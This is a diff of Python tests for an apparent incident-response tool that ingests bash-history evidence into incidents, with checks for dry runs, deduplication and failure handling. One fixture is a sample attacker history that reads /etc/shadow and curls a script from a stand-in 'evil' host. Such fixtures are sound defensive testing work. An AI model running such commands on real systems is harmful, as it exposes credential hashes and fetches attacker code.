@@ -697,38 +697,76 @@ def test_an_artifact_is_tagged_given_a_date_linked_and_taken_out(admin: TestClie
 # --------------------------------------------------------------------------- #
 # Host evidence                                                               #
 # --------------------------------------------------------------------------- #
-def test_host_evidence_is_parsed_into_the_tab_of_its_kind(admin: TestClient):
+def reading_here(monkeypatch, events=None):
+    """The worker that reads files is there, and the reading starts where it is asked (not in a thread)."""
+    from app import work
+    from app.evidence import parse
+    from tests.test_evidence_intake import HISTORY
+    from tests.test_evidence_parse import end, record
+
+    monkeypatch.setattr(settings, "FORENSICS_URL", "http://forensics.test")
+    said = events if events is not None else [HISTORY, record(1), record(2), end(2, in_file=2)]
+    monkeypatch.setattr(parse, "_events", lambda sha256, body, job: iter(said))
+
+    def start(source_id, _params=None):
+        with work.hold(parse.WORK, source_id) as claim:
+            parse.read(source_id, claim)
+        return True
+
+    monkeypatch.setattr(parse, "start", start)
+
+
+def test_host_evidence_is_kept_and_read_as_a_source_of_the_incident(admin: TestClient, monkeypatch):
+    reading_here(monkeypatch)
     incident(admin, "i1")
     history = "#1700000000\nsudo cat /etc/shadow\ncurl http://files.evil.example/x.sh\n"
     held = upload(admin, ".bash_history", b"#1700000001\nwhoami\n")
     typed = act("typed", "nik.add-evidence", kind="commands", shell="bash", content=history, name=".bash_history")
     dry = go(admin, chain(admin, "Evidence dry", typed), objectKind="incident", objectId="i1", dryRun=True)
-    assert steps(dry)["typed"]["output"] == {"rows": 2, "format": "text", "target": "commands/bash"}
+    would = {"rows": 0, "format": "history", "target": "commands/bash", "sourceId": "", "read": ""}
+    assert steps(dry)["typed"]["output"] == would
     assert steps(dry)["typed"]["request"]["would"] == "add commands evidence"
-    assert admin.get("/api/incidents/i1").json()["data"] == {}
+    assert admin.get("/api/incidents/i1/evidence/sources").json()["sources"] == []
 
-    run = go(admin, chain(admin, "Evidence", typed), objectKind="incident", objectId="i1")
+    run = done(admin, chain(admin, "Evidence", typed), objectKind="incident", objectId="i1")
     assert run["status"] == "done", run["error"]
-    assert steps(run)["typed"]["output"] == {"rows": 2, "format": "text", "target": "commands/bash"}
-    shell = admin.get("/api/incidents/i1").json()["data"]["commands"]["shells"]["bash"]
-    assert [entry["command"] for entry in shell["commands"]] == [
-        "sudo cat /etc/shadow",
-        "curl http://files.evil.example/x.sh",
-    ]
-    values = {item["value"] for item in admin.get("/api/incidents/i1/iocs").json()["iocs"]}
-    assert "files.evil.example" in values
+    output = steps(run)["typed"]["output"]
+    assert (output["rows"], output["format"], output["target"], output["read"]) == (
+        2,
+        "history",
+        "commands/bash",
+        "complete",
+    )
+    (source,) = admin.get("/api/incidents/i1/evidence/sources").json()["sources"]
+    assert source["id"] == output["sourceId"]
+    assert admin.get("/api/incidents/i1").json()["data"] == {}
     entry = admin.get("/api/audit?q=action:command.upload").json()["entries"][0]
     assert entry["actor"] == "nik-automation" and entry["details"].startswith("Uploaded .bash_history → commands/bash")
 
-    # From a file Nik holds: read from the store, parsed the same way.
+    # The same file again is the source the incident has: nothing is read twice.
+    again = done(admin, chain(admin, "Evidence twice", typed), objectKind="incident", objectId="i1")
+    assert steps(again)["typed"]["output"]["sourceId"] == output["sourceId"]
+    assert len(admin.get("/api/incidents/i1/evidence/sources").json()["sources"]) == 1
+
+    # From a file Nik holds: read from the store, kept the same way.
+    # Other records than the first file's (the same ones would be duplicates of it, and kept once).
+    from tests.test_evidence_intake import HISTORY
+    from tests.test_evidence_parse import end, record
+
+    reading_here(monkeypatch, [HISTORY, record(3), record(4), end(2, in_file=2)])
     stored = act("stored", "nik.add-evidence", kind="commands", shell="bash", artifact=held)
-    run = go(admin, chain(admin, "Evidence from a file", stored), objectKind="incident", objectId="i1")
-    assert steps(run)["stored"]["output"]["rows"] == 1
+    run = done(admin, chain(admin, "Evidence from a file", stored), objectKind="incident", objectId="i1")
+    assert (
+        steps(run)["stored"]["output"]["rows"] == 2 and steps(run)["stored"]["output"]["sourceId"] != output["sourceId"]
+    )
 
     for args, why in (
         ({"kind": "commands", "shell": "nope", "content": "x"}, "Unknown shell 'nope'."),
         ({"kind": "commands", "shell": "bash"}, "Give an artifact or a content, one of the two"),
-        ({"kind": "eventlogs", "content": "not an event log"}, ""),
+        (
+            {"kind": "endpoint", "category": "persistence", "source": "cron", "content": "x"},
+            "Set the incident's operating",
+        ),
     ):
         run = go(
             admin,
@@ -736,7 +774,35 @@ def test_host_evidence_is_parsed_into_the_tab_of_its_kind(admin: TestClient):
             objectKind="incident",
             objectId="i1",
         )
-        assert run["status"] == "failed" and steps(run)["bad"]["error"].startswith(why)
+        assert run["status"] == "failed" and steps(run)["bad"]["error"].startswith(why), steps(run)["bad"]["error"]
+
+
+def test_a_file_that_cannot_be_read_fails_the_step_with_the_reason(admin: TestClient, monkeypatch):
+    skip = {"t": "skip", "reason": "not a history", "lost": 1, "detail": "binary"}
+    reading_here(monkeypatch, [skip])
+    incident(admin, "i1")
+    node_ = act("typed", "nik.add-evidence", kind="commands", shell="bash", content="x\n", name="h")
+    run = done(admin, chain(admin, "Unreadable", node_), objectKind="incident", objectId="i1")
+    assert run["status"] == "failed" and steps(run)["typed"]["error"] == "not a history: binary"
+
+
+def test_a_worker_that_cannot_write_to_the_store_has_the_api_process_keep_the_evidence(admin: TestClient, monkeypatch):
+    from app.malware import samples
+
+    reading_here(monkeypatch)
+    monkeypatch.setattr(samples, "store_writable", lambda: False)
+    incident(admin, "i1")
+    node_ = act("typed", "nik.add-evidence", kind="commands", shell="bash", content="whoami\n", name="h")
+    run_id = start(admin, chain(admin, "Handed over", node_), T0, objectKind="incident", objectId="i1")
+    worker.drain(T0)
+    assert steps(run_of(admin, run_id))["typed"]["status"] == "waiting"
+    (job,) = jobs()
+    assert (job.kind, job.status) == ("evidence", "queued") and carried(job.id) == b"whoami\n"
+    assert admin.get("/api/incidents/i1/evidence/sources").json()["sources"] == []
+    run = settle(admin, run_id)
+    assert run["status"] == "done", run["error"]
+    assert steps(run)["typed"]["output"]["read"] == "complete"
+    assert len(admin.get("/api/incidents/i1/evidence/sources").json()["sources"]) == 1
 
 
 # --------------------------------------------------------------------------- #
@@ -790,10 +856,11 @@ def paths_of(entry: dict, node_id: str) -> list[str]:
 
 
 def test_every_path_the_editor_offers_under_a_file_node_is_there_when_a_playbook_runs(
-    admin: TestClient, no_dns, outside
+    admin: TestClient, no_dns, outside, monkeypatch
 ):
     from tests.stores import zip_of
 
+    reading_here(monkeypatch)
     incident(admin, "i1")
     outside.host("files.example.org")
     outside.answer("files.example.org", 200, body=b"a tool, as text", path="/tool.txt")
